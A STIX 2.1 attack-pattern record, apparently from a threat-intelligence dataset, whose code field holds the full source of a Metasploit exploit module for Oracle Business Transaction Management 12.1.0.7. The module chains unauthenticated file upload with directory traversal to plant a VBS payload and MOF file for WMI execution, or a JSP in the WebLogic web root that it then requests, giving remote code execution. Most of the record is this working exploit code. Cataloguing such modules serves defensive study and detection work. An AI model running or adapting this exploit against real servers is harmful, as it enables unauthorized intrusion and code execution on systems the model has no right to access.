{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cdca4d45-b910-4520-b06f-04a904bf6850",
    "created": "2024-08-14T16:52:11.319228Z",
    "modified": "2024-08-14T16:52:11.319232Z",
    "name": "Oracle Business Transaction Management FlashTunnelService Remote Code Execution",
    "description": " This module exploits abuses the FlashTunnelService SOAP web service on Oracle Business Transaction Management 12.1.0.7 to upload arbitrary files, without authentication, using the WriteToFile method. The same method contains a directory traversal vulnerability, which allows to upload the files to arbitrary locations.  In order to execute remote code two techniques are provided. If the Oracle app has been deployed in the same WebLogic Samples Domain a JSP can be uploaded to the web root. If a new Domain has been used to deploy the Oracle application, the Windows Management Instrumentation service can be used to execute arbitrary code.  Both techniques have been successfully tested on default installs of Oracle BTM 12.1.0.7, Weblogic 12.1.1 and Windows 2003 SP2. Default path traversal depths are provided, but the user can configure the traversal depth using the DEPTH option.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/oracle_btm_writetofile.rb",
            "external_id": "oracle_btm_writetofile.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Oracle Business Transaction Management FlashTunnelService Remote Code Execution',\n        'Description' => %q{\n          This module exploits abuses the FlashTunnelService SOAP web service on Oracle\n          Business Transaction Management 12.1.0.7 to upload arbitrary files, without\n          authentication, using the WriteToFile method. The same method contains a directory\n          traversal vulnerability, which allows to upload the files to arbitrary locations.\n\n          In order to execute remote code two techniques are provided. If the Oracle app has\n          been deployed in the same WebLogic Samples Domain a JSP can be uploaded to the web\n          root. If a new Domain has been used to deploy the Oracle application, the Windows\n          Management Instrumentation service can be used to execute arbitrary code.\n\n          Both techniques have been successfully tested on default installs of Oracle BTM\n          12.1.0.7, Weblogic 12.1.1 and Windows 2003 SP2. Default path traversal depths are\n          provided, but the user can configure the traversal depth using the DEPTH option.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery and PoC\n          'sinn3r', # Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n        'References' => [\n          [ 'OSVDB', '85087' ],\n          [ 'BID', '54839' ],\n          [ 'EDB', '20318' ]\n        ],\n        'DefaultOptions' => {\n          'WfsDelay' => 5\n        },\n        'Payload' => {\n          'DisableNops' => true,\n          'Space' => 2048,\n          'StackAdjustment' => -3500\n        },\n        'Platform' => %w{java win},\n        'Targets' => [\n          [\n            'Oracle BTM 12.1.0.7 / Weblogic 12.1.1 with Samples Domain / Java',\n            {\n              'Arch' => ARCH_JAVA,\n              'Depth' => 10\n            },\n          ],\n          [\n            'Oracle BTM 12.1.0.7 / Windows 2003 SP2 through WMI',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win',\n              'Depth' => 13\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2012-08-07',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(7001),\n        OptInt.new('DEPTH', [false, 'Traversal depth'])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def on_new_session(client)\n    return if not @var_mof_name\n    return if not @var_vbs_name\n\n    if client.type != \"meterpreter\"\n      print_error(\"NOTE: you must use a meterpreter payload in order to automatically cleanup.\")\n      print_error(\"The vbs payload (C:\\\\windows\\\\system32\\\\#{@var_vbs_name}.vbs) and mof file (C:\\\\windows\\\\system32\\\\wbem\\\\mof\\\\good\\\\#{@var_mof_name}.mof) must be removed manually.\")\n      return\n    end\n\n    # stdapi must be loaded before we can use fs.file\n    client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n\n    cmd = \"C:\\\\windows\\\\system32\\\\attrib.exe -r \" +\n          \"C:\\\\windows\\\\system32\\\\wbem\\\\mof\\\\good\\\\\" + @var_mof_name + \".mof\"\n\n    client.sys.process.execute(cmd, nil, { 'Hidden' => true })\n\n    begin\n      print_warning(\"Deleting the vbs payload \\\"#{@var_vbs_name}.vbs\\\" ...\")\n      client.fs.file.rm(\"C:\\\\windows\\\\system32\\\\\" + @var_vbs_name + \".vbs\")\n      print_warning(\"Deleting the mof file \\\"#{@var_mof_name}.mof\\\" ...\")\n      client.fs.file.rm(\"C:\\\\windows\\\\system32\\\\wbem\\\\mof\\\\good\\\\\" + @var_mof_name + \".mof\")\n    rescue ::Exception => e\n      print_error(\"Exception: #{e.inspect}\")\n    end\n  end\n\n  def exploit\n    peer = \"#{rhost}:#{rport}\"\n\n    if target.name =~ /WMI/\n\n      # In order to save binary data to the file system the payload is written to a .vbs\n      # file and execute it from there.\n      @var_mof_name = rand_text_alpha(rand(5) + 5)\n      @var_vbs_name = rand_text_alpha(rand(5) + 5)\n\n      print_status(\"Encoding payload into vbs...\")\n      my_payload = generate_payload_exe\n      vbs_content = Msf::Util::EXE.to_exe_vbs(my_payload)\n\n      print_status(\"Generating mof file...\")\n      mof_content = generate_mof(\"#{@var_mof_name}.mof\", \"#{@var_vbs_name}.vbs\")\n\n      if not datastore['DEPTH'] or datastore['DEPTH'] == 0\n        traversal = \"..\\\\\" * target['Depth']\n      else\n        traversal = \"..\\\\\" * datastore['DEPTH']\n      end\n      traversal << \"WINDOWS\\\\system32\\\\#{@var_vbs_name}.vbs\"\n\n      print_status(\"Uploading the VBS payload\")\n\n      soap_request = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" \"\n      soap_request << \"xmlns:int=\\\"http://schemas.amberpoint.com/flashtunnel/interfaces\\\" \"\n      soap_request << \"xmlns:typ=\\\"http://schemas.amberpoint.com/flashtunnel/types\\\">\"\n      soap_request << \"\t<soapenv:Header/>\"\n      soap_request << \"\t<soapenv:Body>\"\n      soap_request << \"\t\t<int:writeToFileRequest>\"\n      soap_request << \"\t\t\t<int:writeToFile handle=\\\"#{traversal}\\\">\"\n      soap_request << \"\t\t\t\t<typ:text>#{Rex::Text.html_encode(vbs_content)}</typ:text>\"\n      soap_request << \"\t\t\t\t<typ:WriteToFileRequestVersion>\"\n      soap_request << \"\t\t\t\t</typ:WriteToFileRequestVersion>\"\n      soap_request << \"\t\t\t</int:writeToFile>\"\n      soap_request << \"\t\t</int:writeToFileRequest>\"\n      soap_request << \"\t</soapenv:Body>\"\n      soap_request << \"</soapenv:Envelope>\"\n\n      res = send_request_cgi(\n        {\n          'uri' => '/btmui/soa/flash_svc/',\n          'version' => '1.1',\n          'method' => 'POST',\n          'ctype' => \"text/xml;charset=UTF-8\",\n          'SOAPAction' => \"\\\"http://soa.amberpoint.com/writeToFile\\\"\",\n          'data' => soap_request,\n        }, 5\n      )\n\n      if res and res.code == 200 and res.body =~ /writeToFileResponse/\n        print_good(\"VBS payload successfully uploaded\")\n      else\n        print_error(\"Failed to upload the VBS payload\")\n        return\n      end\n\n      if not datastore['DEPTH'] or datastore['DEPTH'] == 0\n        traversal = \"..\\\\\" * target['Depth']\n      else\n        traversal = \"..\\\\\" * datastore['DEPTH']\n      end\n      traversal << \"WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{@var_mof_name}.mof\"\n\n      soap_request = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" \"\n      soap_request << \"xmlns:int=\\\"http://schemas.amberpoint.com/flashtunnel/interfaces\\\" \"\n      soap_request << \"xmlns:typ=\\\"http://schemas.amberpoint.com/flashtunnel/types\\\">\"\n      soap_request << \"\t<soapenv:Header/>\"\n      soap_request << \"\t<soapenv:Body>\"\n      soap_request << \"\t\t<int:writeToFileRequest>\"\n      soap_request << \"\t\t\t<int:writeToFile handle=\\\"#{traversal}\\\">\"\n      soap_request << \"\t\t\t\t<typ:text>#{Rex::Text.html_encode(mof_content)}</typ:text>\"\n      soap_request << \"\t\t\t\t<typ:WriteToFileRequestVersion>\"\n      soap_request << \"\t\t\t\t</typ:WriteToFileRequestVersion>\"\n      soap_request << \"\t\t\t</int:writeToFile>\"\n      soap_request << \"\t\t</int:writeToFileRequest>\"\n      soap_request << \"\t</soapenv:Body>\"\n      soap_request << \"</soapenv:Envelope>\"\n\n      print_status(\"Uploading the MOF file\")\n\n      res = send_request_cgi(\n        {\n          'uri' => '/btmui/soa/flash_svc/',\n          'version' => '1.1',\n          'method' => 'POST',\n          'ctype' => \"text/xml;charset=UTF-8\",\n          'SOAPAction' => \"\\\"http://soa.amberpoint.com/writeToFile\\\"\",\n          'data' => soap_request,\n        }, 5\n      )\n\n      if res and res.code == 200 and res.body =~ /writeToFileResponse/\n        print_good(\"MOF file successfully uploaded\")\n      else\n        print_error(\"Failed to upload the MOF file\")\n        return\n      end\n\n    elsif target['Arch'] == ARCH_JAVA\n\n      @jsp_name = rand_text_alpha(rand(5) + 5)\n\n      if not datastore['DEPTH'] or datastore['DEPTH'] == 0\n        traversal = \"..\\\\\" * target['Depth']\n      else\n        traversal = \"..\\\\\" * datastore['DEPTH']\n      end\n      traversal << \"\\\\server\\\\examples\\\\build\\\\mainWebApp\\\\#{@jsp_name}.jsp\"\n\n      print_status(\"Uploading the JSP payload\")\n\n      soap_request = \"<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" \"\n      soap_request << \"xmlns:int=\\\"http://schemas.amberpoint.com/flashtunnel/interfaces\\\" \"\n      soap_request << \"xmlns:typ=\\\"http://schemas.amberpoint.com/flashtunnel/types\\\">\"\n      soap_request << \"\t<soapenv:Header/>\"\n      soap_request << \"\t<soapenv:Body>\"\n      soap_request << \"\t\t<int:writeToFileRequest>\"\n      soap_request << \"\t\t\t<int:writeToFile handle=\\\"#{traversal}\\\">\"\n      soap_request << \"\t\t\t\t<typ:text>#{Rex::Text.html_encode(payload.encoded)}</typ:text>\"\n      soap_request << \"\t\t\t\t<typ:WriteToFileRequestVersion>\"\n      soap_request << \"\t\t\t\t</typ:WriteToFileRequestVersion>\"\n      soap_request << \"\t\t\t</int:writeToFile>\"\n      soap_request << \"\t\t</int:writeToFileRequest>\"\n      soap_request << \"\t</soapenv:Body>\"\n      soap_request << \"</soapenv:Envelope>\"\n\n      res = send_request_cgi(\n        {\n          'uri' => '/btmui/soa/flash_svc/',\n          'version' => '1.1',\n          'method' => 'POST',\n          'ctype' => \"text/xml;charset=UTF-8\",\n          'SOAPAction' => \"\\\"http://soa.amberpoint.com/writeToFile\\\"\",\n          'data' => soap_request,\n        }, 5\n      )\n\n      if res and res.code == 200 and res.body =~ /writeToFileResponse/\n        print_status(\"JSP payload successfully uploaded\")\n      else\n        print_error(\"Failed to upload the JSP payload\")\n        return\n      end\n\n      print_status(\"Executing the uploaded JSP #{@jsp_name}.jsp ...\")\n      res = send_request_cgi(\n        {\n          'uri' => \"/#{@jsp_name}.jsp\",\n          'version' => '1.1',\n          'method' => 'GET',\n        }, 5\n      )\n\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-07",
    "x_mitre_platforms": [
        "win'"
    ]
}